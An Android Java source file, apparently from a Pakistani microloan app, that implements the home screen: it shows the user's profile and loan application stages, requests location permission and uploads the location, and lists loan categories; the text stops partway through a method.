package com.nano.liteloan.presentation.fragment;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Typeface;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.widget.NestedScrollView;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.nano.liteloan.R;
import com.nano.liteloan.business.impl.EasyLoanBusiness;
import com.nano.liteloan.business.impl.UserBusiness;
import com.nano.liteloan.delegate.ResponseCallBack;
import com.nano.liteloan.info.ApplicationList;
import com.nano.liteloan.info.ApplyAgain;
import com.nano.liteloan.info.CallLogs;
import com.nano.liteloan.info.ConfigurationRespondObject;
import com.nano.liteloan.info.ContactInfo;
import com.nano.liteloan.info.LoanCategoryInfo;
import com.nano.liteloan.info.LoanCategoryItems;
import com.nano.liteloan.info.Location;
import com.nano.liteloan.info.LocationUpdate;
import com.nano.liteloan.info.ProductInfo;
import com.nano.liteloan.info.ProfileCreateResponseInfo;
import com.nano.liteloan.info.SmsLog;
import com.nano.liteloan.info.StagesInfo;
import com.nano.liteloan.info.SyncCallResponce;
import com.nano.liteloan.info.SyncLogs;
import com.nano.liteloan.info.UserDate;
import com.nano.liteloan.info.UserProfile;
import com.nano.liteloan.info.responce.StageDetailInfo;
import com.nano.liteloan.info.responce.StageInfo;
import com.nano.liteloan.info.responce.StageInfoResponse;
import com.nano.liteloan.presentation.activity.MainActivity;
import com.nano.liteloan.presentation.adapters.LoanCategoryAdapter;
import com.nano.liteloan.presentation.adapters.StagesAdapter;
import com.nano.liteloan.presentation.fragment.dialoguefragment.HintDialogue;
import com.nano.liteloan.presentation.fragment.dialoguefragment.ScoreHintDialogue;
import com.nano.liteloan.utils.AppConstantsUtils;
import com.nano.liteloan.utils.AppUtils;
import com.nano.liteloan.utils.OnItemClickListener;
import com.nano.liteloan.utils.PreferenceUtils;
import com.nano.liteloan.utils.alerts.AlertUtils;
import com.squareup.picasso.Picasso;
import com.victor.loading.rotate.RotateLoading;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by Muhammad Umer on 07/06/2020.
 * Modified by Muhammad Ahmad.
 */

public class HomeFragment extends Fragment {

    private MainActivity context;
    private int flagFeereject = 0;
    private String remainingBalanc = "";
    private RecyclerView rvLoans;
    private TextView tvName, tvEmail, tvCity, tvNumber;
    private RotateLoading loading;
    private ImageView profileImage;
    private TextView tvScore;
    private String surveyFlag = "0";
    String feePaidLoanId = "0";
    private NestedScrollView scrollView;
    private LoanCategoryInfo loanCategoryInfo;
    private boolean isProfileUpdated = true;
    private ProgressBar progressBar;
    private ImageView step1Tick, step4Tick;
    private View step1View, step3View;
    private TextView tvStatus;
    // private MeowBottomNavigation bottomNavigation;
    private RecyclerView rvStages, rvIndicators;
    private ImageView ivBasicLogo, ivEvaluationLogo, ivWalletLogo;
    Location loc;
    private static final int REQUEST_LOCATION = 1;
    private RelativeLayout rlemail;
    LocationManager locationManager;
    private String name;
    public static final String DATE_FORMAT_2 = "yyyy-MM-dd HH:mm:ss";
    private ImageView ivEmailIcon;
    private ImageView ivLoaction;
    private ImageView ivScoreHint;
    private TextView tvLoginAs;

    private LoanCategoryInfo loanCategoryFeePaid;

    List<ProductInfo> productInfos;

    public HomeFragment() {
        // Required empty public constructor
    }

    public void onAttach(@NonNull Context context) {
        super.onAttach(context);
        this.context = (MainActivity) context;


    }

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//
    }

    @Override
    public View onCreateView(LayoutInflater inflater, final ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View view = inflater.inflate(R.layout.fragment_home, container, false);
        this.context.setNavigationMenu(0);
        loc = new Location();
        getLongLat();

        ivEmailIcon = view.findViewById(R.id.iv_logo_email);
        tvLoginAs = view.findViewById(R.id.tv_login_as);
        ivLoaction = view.findViewById(R.id.iv_logo_city);
        ivScoreHint = view.findViewById(R.id.hint);
        ivScoreHint.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ScoreHintDialogue dialog1 = new ScoreHintDialogue();
                dialog1.show(getChildFragmentManager(),
                        HintDialogue.class.getName());
            }
        });

        tvStatus = view.findViewById(R.id.status);

        final SwipeRefreshLayout pullToRefresh = view.findViewById(R.id.pullToRefresh);
        pullToRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                context.homeFrag();
            }
        });

        scrollView = view.findViewById(R.id.main_layout);
        rlemail = view.findViewById(R.id.rlemail);
        //   bottomNavigation = view.findViewById(R.id.bottom_navigation);
        rvStages = view.findViewById(R.id.rv_stages);
        rvStages.setLayoutManager(new LinearLayoutManager(context,
                RecyclerView.HORIZONTAL, false));

        rvIndicators = view.findViewById(R.id.rv_indicators);
        rvIndicators.setLayoutManager(new LinearLayoutManager(context,
                RecyclerView.HORIZONTAL, false));

        rvLoans = view.findViewById(R.id.rv_loans);

        rvLoans.setLayoutManager(new LinearLayoutManager(context));
        profileImage = view.findViewById(R.id.imageView);
        tvScore = view.findViewById(R.id.score);
        progressBar = view.findViewById(R.id.progressBar);

        loading = view.findViewById(R.id.rotateloading);

        tvName = view.findViewById(R.id.tv_name);
        tvEmail = view.findViewById(R.id.tv_email);
        tvNumber = view.findViewById(R.id.tv_phone);
        tvCity = view.findViewById(R.id.tv_city);

        ivBasicLogo = view.findViewById(R.id.iv_basic_logo);
//        ivEvaluationLogo = view.findViewById(R.id.iv_evaluation_logo);
        ivWalletLogo = view.findViewById(R.id.iv_wallet_logo);

        getProfile();

        getConfigurations();

        ImageView ivDrawer = view.findViewById(R.id.iv_drawer);
        ivDrawer.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                context.openDrawer();
            }
        });


        step1Tick = view.findViewById(R.id.step1_tick);
//        step3Tick = view.findViewById(R.id.step3_tick);
        step4Tick = view.findViewById(R.id.step4_tick);

        step1View = view.findViewById(R.id.step1_view);
        step3View = view.findViewById(R.id.step3_view);


        getStageInformation();

        ivBasicLogo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                context.mainProfileFrag(0);
            }
        });

//        ivEvaluationLogo.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//
//                context.evaluationFragment();
//            }
//        });

        ivWalletLogo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                context.mobileWalletFragment();
            }
        });
        if (PreferenceUtils.getInstance().getCorrespondentUserDetail() != null
                && PreferenceUtils.getInstance().getCorrespondentUserDetail().getName() != null) {
            tvLoginAs.setText("Login by "
                    + PreferenceUtils.getInstance().getCorrespondentUserDetail().getName());
        }
        return view;
    }


    private void getLongLat() {
        locationManager = (LocationManager) context.getSystemService(context.LOCATION_SERVICE);
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            onGPS();
        } else {
            getLocation();
        }

    }


    private void getLocation() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(context, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);
        } else {
            android.location.Location locationGps = locationManager.getLastKnownLocation(locationManager.GPS_PROVIDER);
            android.location.Location locationNetwork = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            android.location.Location locationPassive = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);

            if (locationGps != null) {
                loc.setLatitude(String.valueOf(locationGps.getLatitude()));

                loc.setLongitude(String.valueOf(locationGps.getLongitude()));
                updateLocation();
            } else if (locationNetwork != null) {
                loc.setLatitude(String.valueOf(locationNetwork.getLatitude()));
                loc.setLongitude(String.valueOf(locationNetwork.getLongitude()));
                updateLocation();
            } else if (locationPassive != null) {
                loc.setLatitude(String.valueOf(locationPassive.getLatitude()));
                loc.setLongitude(String.valueOf(locationPassive.getLongitude()));
                updateLocation();
            } else {
//                AlertUtils.showAlert(context, "Can't get your location");
            }
        }
    }

    private void updateLocation() {
        if (loc.getLatitude() != null && loc.getLongitude() != null && !loc.getLatitude().equals("") && !loc.getLongitude().equals("")) {
            EasyLoanBusiness business = new EasyLoanBusiness();
            business.updateLocation(loc, new ResponseCallBack<LocationUpdate>() {
                @Override
                public void onSuccess(LocationUpdate body) {


                }

                @Override
                public void onFailure(String message) {


                }
            });
        }
    }


    private void onGPS() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setMessage("Enable GPS").setCancelable(false).setPositiveButton("Yes", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
            }
        }).setNegativeButton("NO", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                dialogInterface.cancel();
            }
        });
        final AlertDialog alertDialog = builder.create();
        alertDialog.setOnShowListener(new DialogInterface.OnShowListener() {
            @SuppressLint("ResourceAsColor")
            @Override
            public void onShow(DialogInterface arg0) {
                alertDialog.getButton(AlertDialog.BUTTON_NEGATIVE).setTextColor(R.color.Black);
                alertDialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(R.color.Black);
            }
        });
        alertDialog.show();
    }


    private void getStageInformation() {

        UserBusiness business = new UserBusiness();
        business.getStageInfo(new ResponseCallBack<StageInfoResponse>() {
            @Override
            public void onSuccess(StageInfoResponse body) {

                if (body.stageInfoList != null) {

                    if(body.stageInfoList.fee.loanfee != 0){
                        PreferenceUtils.getInstance().setFee(String.valueOf(body.stageInfoList.fee.loanfee));
                    }
                    setStagesAdapter(body.stageInfoList, body.stageInfoList.stageInfoList);
                }
            }

            @Override
            public void onFailure(String message) {

            }
        });


    }

    private void setStagesAdapter(StageInfo infoList, List<StageDetailInfo> stageInfoList) {

        boolean basic = true, wallet = true, account = true;
        boolean docs = true;

        boolean feeConfirmation = false;
        boolean statusEvaluation = true;
        boolean statusLoanApplication = false;
        boolean applicationRejected = false;
        boolean appSubmitted = false;
        boolean appfee = true;
        boolean verificationpending = false;
        int payBack = 0;

        String basicStr = "";
        String basicHeading = "";

        for (StageDetailInfo stage : stageInfoList) {

            if (stage.stageNumber == 1 && stage.status == 0) {

                basic = false;
            } else if (stage.stageNumber == 2 && stage.status == 0) {

                basic = false;

            } else if (stage.stageNumber == 4 && stage.status == 0) {

                docs = false;

            }

//            if (stage.stageNumber == 3 && stage.status == 0) {
//
//                evaluation = false;
//            }

            if (stage.stageNumber == 5 && stage.status == 0) {

                wallet = false;
            }

//            if (stage.stageNumber == 7 && stage.status == 0) {
//                fee = false;
//            }


            if (stage.stageNumber == 8 && stage.status == 0) {

            }
            if (stage.stageNumber == 9 && stage.status == 1) {
                feeConfirmation = true;
            }
            if (stage.stageNumber == 13 && stage.status == 0) {   //added between stage 9 and 10
                appfee = false;
            }
            if (stage.stageNumber == 10 && stage.status == 1) {
                statusLoanApplication = true;
            }

            if (stage.stageNumber == 11 && stage.status == 1) {

                applicationRejected = true;
            }
            if (stage.stageNumber == 12 && stage.status == 1) {
                appSubmitted = true;
            }

            if (stage.stageNumber == 14 && stage.status == 1) {
                verificationpending = true;
            }


        }

        final List<StagesInfo> list = new ArrayList<>();
        boolean isVerify = true;

        if (infoList.payBackInfo != null && infoList.payBackInfo.status != 0) {
            payBack = infoList.payBackInfo.status;
        }

        if (infoList.feeVerifyInfo.status == 1
                || infoList.applicationVerifyInfo.status == 1
                || infoList.bankVerifyInfo.status == 1
                || infoList.recoveryVerifyInfo.status == 1) {
            isVerify = false;

            if (infoList.feeVerifyInfo.status == 1) {
                String reason = "";
                flagFeereject = 1;
                if (infoList.feeVerifyInfo.reasonList != null
                        && infoList.feeVerifyInfo.reasonList.size() > 0) {
                    for (String rea : infoList.feeVerifyInfo.reasonList) {
                        reason = reason + rea + "\n";
                    }
                }
                tvStatus.setText("Application Fee");
                list.add(new StagesInfo(AppConstantsUtils.StageUtils.FEE,
                        "Application Fee Status!",
                        "Application fee is Rejected!. Because\n" +
                                reason, "application_fee"));
            }

            if (infoList.recoveryVerifyInfo.status == 1) {
                String reason = "";
                if (infoList.recoveryVerifyInfo.reasonList != null
                        && infoList.recoveryVerifyInfo.reasonList.size() > 0) {
                    for (String rea : infoList.recoveryVerifyInfo.reasonList) {
                        reason = reason + rea + "\n";
                    }
                }
                tvStatus.setText("Recovery Under Review");
                list.add(new StagesInfo("recovery_issue",
                        "Recovery Issue!",
                        "Recovery payment is Rejected!. Because\n" +
                                reason, "ic_pay_back"));

            }
            if (infoList.applicationVerifyInfo.status == 1) {
                String reason = "";
                if (infoList.applicationVerifyInfo.reasonList != null
                        && infoList.applicationVerifyInfo.reasonList.size() > 0) {
                    for (String rea : infoList.applicationVerifyInfo.reasonList) {
                        reason = reason + rea + "\n";
                    }
                }
                tvStatus.setText("Application Under Review");
                list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATIONREJECTED,
                        "Application Status!",
                        "Application is Rejected!. Because " +
                                reason + "so apply again from below list.", "in_process_stage"));
            }

            if (infoList.bankVerifyInfo.status == 1) {
                String reason = "";
                if (infoList.bankVerifyInfo.reasonList != null
                        && infoList.bankVerifyInfo.reasonList.size() > 0) {
                    for (String rea : infoList.bankVerifyInfo.reasonList) {
                        reason = reason + rea + "\n";
                    }
                }
                list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_BANK,
                        "Account Status!",
                        "Bank Account information is wrong!.\n" +
                                reason, "in_process_stage"));
            }

        }

        if (isVerify) {
            if (!applicationRejected) {

                if (!basic && !docs && isVerify) {
                    tvStatus.setText("Complete Profile");
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.BASIC, "Profile",
                            "Please submit profile information", "ic_basic_information_done"));

                } else if (basic && !docs && isVerify) {
                    tvStatus.setText("Complete Profile");
                    basicHeading = "Profile Documents";
                    basicStr = "Profile documents are pending";
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.BASIC_DOC, basicHeading,
                            basicStr, "ic_basic_information_done"));

                } else {

                    setStageOneCompete();
                }

//                if (!evaluation && isVerify) {
//
//                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.EVALUATION, "Evaluation",
//                            "Please submit your information for evaluation", "ic_evaluation"));
//
//                }
                if (basic) {

                    setStageFourComplete();
                }

//                if (!wallet && isVerify && surveyFlag.equalsIgnoreCase("0")) {
//
//                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.SURVEY, "Survey  ",
//                            "Help us by taking this short customer satisfication survey to improve our serves.", "ic_survey"));
//                }
//                surveyFlag.equalsIgnoreCase("1")

                if (!wallet && isVerify && basic) {
                    tvStatus.setText("Add Wallet / Account Details");
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.WALLET, "Wallet / Account Info",
                            "Add mobile wallet / bank account information", "ic_mobile_wallet_done"));
                } else if (basic && isVerify) {

                    setStageFiveComplete();
                }
//                if (!fee && wallet && basic  && docs) {
//                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.FEE, "Application Fee",
//                            "Please pay your application fee", "application_fee"));
//                    flagFeereject = 0;
//                }

                if (!appSubmitted && wallet && basic && docs) {

                    tvStatus.setText("Apply for a Loan");
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_NOT_EVALUATION, "Apply Loan",
                            "Now you can apply for a loan. Please select the loan product from the list below.", "ic_apply_loan"));
//                    getLogsDetails();

                    //list.add(new StagesInfo(AppConstantsUtils.StageUtils.FEE_CONFIRMATION, "Fee Confirmation!",
                    //      "you will be intimated within 2 working days about fee confirmation", "application_fee"));
                }
//
//                if (appSubmitted && wallet && basic && docs ) {
//                    tvStatus.setText("Application Under Review");
//                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATION, "Application!",
//                            "Dear " + name + ", While you wait for your loan approval. Find out more about the team at e-Qard  " +
//                                    "and our mission to empower everyone " +
//                                    "in society and eradicate poverty.", "ic_application_submited"));
//                }

//                if (!statusEvaluation && appSubmitted && wallet
//                        && basic && docs ) {
//                    tvStatus.setText("Application Under Review");
//                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATION,
//                            "Application !",
//                            "Your loan evaluation is in-process, we will update you shortly!",
//                            "all_stages_done"));
//                }

                if (!appfee && statusEvaluation && appSubmitted && wallet
                        && basic && docs ) {
                    tvStatus.setText("Pay Application Fee");
                    String message = "Pay application fee. \n Application fee should be paid from your own added mobile wallet / bank account";
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);

                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.FEE,
                            "Application Fee",
                            null,
                            "application_fee", updateMessage));
                }


                if (  appfee && statusEvaluation && appSubmitted && wallet
                        && basic && docs && !feeConfirmation) {

                    tvStatus.setText("Application Under Review");
                    String message = "Verification of fee is in process. You will be informed soon.";
                    flagFeereject = 0;
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);

                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATION,
                            "Application Status!",
                            null,
                            "ic_apply_loan", updateMessage));
                }


                if ( !verificationpending && feeConfirmation
                        && appSubmitted && wallet && basic  && docs) {
                    tvStatus.setText("Visit Pending");
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_NOT_EVALUATION, "Visit Pending",
                            "Fee has been verified, Our representative will visit you soon.", "in_process_stage"));
                }

                if ( !statusLoanApplication && verificationpending && feeConfirmation
                        && appSubmitted && wallet && basic  && docs) {
                    tvStatus.setText("Disbursement Pending");
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_NOT_EVALUATION, "Disbursement Pending",
                            "Loan has been approved. The loan amount will be transfered to your wallet / account soon.", "in_process_stage"));
                }


                if (!statusLoanApplication && statusEvaluation && feeConfirmation
                        && wallet && basic && docs) {
                    //  list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATION, "Loan Application Status!",
                    //  "Your request has been received. You will be intimated within 2 working day", "in_process_stage"));
                } else if ((payBack == 0) && statusLoanApplication && statusEvaluation
                        && feeConfirmation && wallet && basic && docs) {

                    tvStatus.setText("Loan Approval");
                    String message = "Congratulations, Loan amount of *Rs. " + AppUtils.getFormatAmount(infoList.approvedAmount) +
                            "* has been transferred into account.\n Please Repay your loan amount before "+infoList.payBackInfo.dueDate +
                            "";
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_REPAY, "Recovery Status!",
                            null, updateMessage, "ic_pay_back", payBack));
                } else if ((payBack == 1) && statusLoanApplication && statusEvaluation
                        && feeConfirmation && wallet && basic && docs) {

                    tvStatus.setText("Loan due in " + infoList.payBackInfo.days + " Days");
                    String message = " You have to repay your loan amount "+ AppUtils.getFormatAmount(remainingBalanc)+" before "+infoList.payBackInfo.dueDate;
//                            "Outstanding amount due is *Rs. " + AppUtils.getFormatAmount(remainingBalanc) + "*. " +
//                                    "Repay amount within  *" + infoList.payBackInfo.days + " days. * ";
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_REPAY, "Recovery Status!",
                            null, updateMessage, "ic_pay_back", payBack));
                } else if ((payBack == 2) && statusLoanApplication && statusEvaluation
                        && feeConfirmation && wallet && basic && docs) {

                    tvStatus.setText("Repayment being verified");
                    String message = "We are verifying your repayment .";
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_REPAY, "Recovery Status!",
                            null, updateMessage, "ic_pay_back", payBack));
                } else if ((payBack == 3) && statusLoanApplication && statusEvaluation
                        && feeConfirmation && wallet && basic && docs) {
                    tvStatus.setText("Thank you");

                    String message = "Recovery has been verified. Thank you  .";
                    CharSequence updateMessage = AppUtils.updateSpan(message, "*", Typeface.BOLD);
                    list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_REPAY, "Recovery Status!",
                            null, updateMessage, "ic_pay_back", payBack));
                }


            } else {

                list.add(new StagesInfo(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATIONR, "Application Status!",
                        "Application is Rejected!.\n" +
                                "we are sorry we cannot offer you a loan at this time.", "in_process_stage"));
            }
        }


//        if (basic && evaluation && wallet) {
//
//            if (PreferenceUtils.getInstance().isFeePaid()) {
//
//                list.add(new StagesInfo(AppConstantsUtils.StageUtils.IN_PROCESS, "Evaluation is process",
//                        "your evaluation is in process. You will be intimated within 48 hours.", "in_process_stage"));
//            } else {
//
//
//            }
//        }


        StagesAdapter stagesAdapter = new StagesAdapter(context, list);

        rvStages.setAdapter(stagesAdapter);


//        IndicatorAdapter indicatorAdapter = new IndicatorAdapter(context, list.size());
//        rvIndicators.setAdapter(indicatorAdapter);
//
//        LinearSnapHelper linearSnapHelper = new SnapHelperOneByOne(indicatorAdapter);
//        linearSnapHelper.attachToRecyclerView(rvStages);

        stagesAdapter.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(View view, int position) {

                String name = list.get(position).getName();
                if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.BASIC)) {

                    context.mainProfileFrag(0);

                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATION)) {
                    context.aboutUsFragment();
                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATIONR)) {
//                    Bundle bundle = new Bundle();
//                    bundle.putBoolean("is_click", true);
//                    context.myLoanFrag(bundle);
                    EasyLoanBusiness business = new EasyLoanBusiness();
                    business.applyAgain(new ResponseCallBack<ApplyAgain>() {

                        @Override
                        public void onSuccess(ApplyAgain body) {

                            context.homeFrag();
                        }

                        @Override
                        public void onFailure(String message) {

                        }
                    });
//                else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.SURVEY)) {
//
//                    context.surveyFragment();
//
//                }
                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.BASIC_DOC)) {

                    context.mainProfileFrag(2);
//  else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.EVALUATION)) {
//
//                        context.evaluationFragment();
//
//                    }
                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.WALLET)) {

                    context.mobileWalletFragment();

                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.FEE)) {

                    context.payFeeFragment();

                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_NOT_EVALUATION)) {
                    if (loanCategoryInfo != null) {
                        scrollView.fullScroll(ScrollView.FOCUS_DOWN);
                        context.callGeneralLoanFragment(loanCategoryInfo);
                    }

                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_REPAY) && list.get(position).getId() != 3) {
                    Bundle bundle = new Bundle();
                    bundle.putBoolean("is_click", true);
                    context.payRecoveryUser(AppUtils.getFormatAmount(remainingBalanc));
                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_REPAY) && list.get(position).getId() == 3) {
                    EasyLoanBusiness business = new EasyLoanBusiness();
                    business.applyAgain(new ResponseCallBack<ApplyAgain>() {

                        @Override
                        public void onSuccess(ApplyAgain body) {

                            context.homeFrag();
                        }

                        @Override
                        public void onFailure(String message) {

                        }
                    });
                } else if (name.equalsIgnoreCase(AppConstantsUtils.StageUtils.STATUS_LOANAPPLICATIONREJECTED)) {
                    EasyLoanBusiness business = new EasyLoanBusiness();
                    business.applyAgain(new ResponseCallBack<ApplyAgain>() {

                        @Override
                        public void onSuccess(ApplyAgain body) {

                            context.homeFrag();
                        }

                        @Override
                        public void onFailure(String message) {

                        }
                    });
                } else if (name.equalsIgnoreCase("recovery_issue")) {
                    Bundle bundle = new Bundle();
                    bundle.putBoolean("is_click", true);
                    context.payRecoveryUser(AppUtils.getFormatAmount(remainingBalanc));
                }
            }
        });

    }

    private void setLoansRecyclerView(final ConfigurationRespondObject body, final int value) {

        LoanCategoryAdapter categoryAdapter = new LoanCategoryAdapter(context,
                body.loanCategories, value);

        rvLoans.setAdapter(categoryAdapter);

        categoryAdapter.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(View view, int position) {

//                if (flagFeereject == 0 && value == 0) {

                context.callGeneralLoanFragment(body.loanCategories.get(position));
//                } else if (flagFeereject == 1) {
//
//                    context.callGeneralLoanFragment(body.loanCategories.get(position));
//
//                } else if (flagFeereject == 0 && value == body.loanCategories.get(position).id) {
//                    context.callGeneralLoanFragment(body.loanCategories.get(position));
//                }

            }
        });

        if (!isProfileUpdated) {

            context.mainProfileFrag(0);
        }

        setBottomNavigation();
    }

    private void setBottomNavigation() {

//        bottomNavigation.add(new MeowBottomNavigation.Model(1, R.drawable.ic_home));
//        bottomNavigation.add(new MeowBottomNavigation.Model(2, R.drawable.ic_explore));
//        bottomNavigation.add(new MeowBottomNavigation.Model(3, R.drawable.ic_message));
    }

    private void getConfigurations() {

        loading.setVisibility(View.VISIBLE);
        loading.start();

        EasyLoanBusiness business = new EasyLoanBusiness();
        business.getLoanCategories(new ResponseCallBack<ConfigurationRespondObject>() {
            @Override
            public void onSuccess(ConfigurationRespondObject body) {

                List<LoanCategoryItems> listItems = new ArrayList<>();
                loading.stop();
                loading.setVisibility(View.GONE);

                if (body.loanCategories != null) {
                    for (int i = 0; i < body.loanCategories.size(); i++) {

                        if (body.loanCategories.get(i).isactive == 1 &&
                                body.loanCategories.get(i).productInfoList.size() > 1) {
                            PreferenceUtils.getInstance().productPurpose(body.loanCategories.get(i).productInfoList);
                        }

                        LoanCategoryItems items = new LoanCategoryItems();
                        if (body.loanCategories.get(i).id == Integer.parseInt(feePaidLoanId)) {
                            loanCategoryInfo = body.loanCategories.get(i);

                        }
                        items.id = body.loanCategories.get(i).id;
                        items.name = body.loanCategories.get(i).name;
                        items.amount = body.loanCategories.get(i).fee;
                        items.isactive = body.loanCategories.get(i).isactive;
                        listItems.add(items);
                    }
                }

                setLoansRecyclerView(body, Integer.parseInt(feePaidLoanId));
                PreferenceUtils.getInstance().addLoanCategoriesDetail(listItems);

            }

            @Override
            public void onFailure(String message) {

                loading.stop();
                loading.setVisibility(View.GONE);
                AlertUtils.showAlert(context, message);
            }
        });
    }

    private void getProfile() {

        final androidx.appcompat.app.AlertDialog dialog = AlertUtils.showLoader(context);

        if (dialog != null) {
            dialog.show();
        }

        UserBusiness userBusiness = new UserBusiness();
        userBusiness.getUserProfile(new ResponseCallBack<ProfileCreateResponseInfo>() {
            @Override
            public void onSuccess(ProfileCreateResponseInfo body) {
                if (dialog != null) {
                    dialog.dismiss();
                }
                PreferenceUtils.getInstance().setRemainingBalance(String.valueOf(body.userDate.outbalance));
                PreferenceUtils.getInstance().setBorrowerType(String.valueOf(body.userDate.getUsertype()));
                context.hideItem(Integer.valueOf(PreferenceUtils.getInstance().getBorrowertype()));
                PreferenceUtils.getInstance().setcorrespondantId(body.userDate.userId);

                if (body.userDate.getScore() != null) {
                    tvScore.setText(body.userDate.getScore());
                } else {
                    tvScore.setText("0");
                }
                if (body.userDate.email != null && !body.userDate.email.equalsIgnoreCase("")) {
                    rlemail.setVisibility(View.VISIBLE);
                } else {
                    rlemail.setVisibility(View.GONE);
                }

                if (body.userDate.synclog == 1) {
                    surveyFlag = body.userDate.getSurveyFlag();
//                    getLogsDetails();
                    name = body.userDate.name;
                    remainingBalanc = body.userDate.outbalance;
                }

                feePaidLoanId = body.userDate.loanid;
                setContent(body.userDate);
                PreferenceUtils.getInstance().setFeePaid(body.userDate.isenable);

            }

            @Override
            public void onFailure(String message) {
                if (dialog != null) {
                    dialog.dismiss();
                }

                AlertUtils.showAlert(context, message);
            }
        });
        if (dialog != null) {
            dialog.dismiss();
        }
    }

    @SuppressLint("SetTextI18n")
    private void setContent(UserProfile userDate) {

        UserDate date = PreferenceUtils.getInstance().getUserDetail();

        if (userDate != null) {

            if (userDate.pin != null && !userDate.pin.isEmpty()) {

                if (PreferenceUtils.getInstance().getCorrespondentUserDetail() == null) {
                    PreferenceUtils.getInstance().setPinCode(userDate.pin);
                }
            }

            if (userDate.name != null && !userDate.name.isEmpty()) {

                tvName.setText(userDate.name);
                context.tvHeaderName.setText(userDate.name);

                date.setName(userDate.name);
            } else {
                context.showInfoFragment();

            }

            if (userDate.email != null) {

                ivEmailIcon.setVisibility(View.VISIBLE);
                tvEmail.setText(userDate.email);
                date.setEmail(userDate.email);
            }
            if (userDate.city != null) {

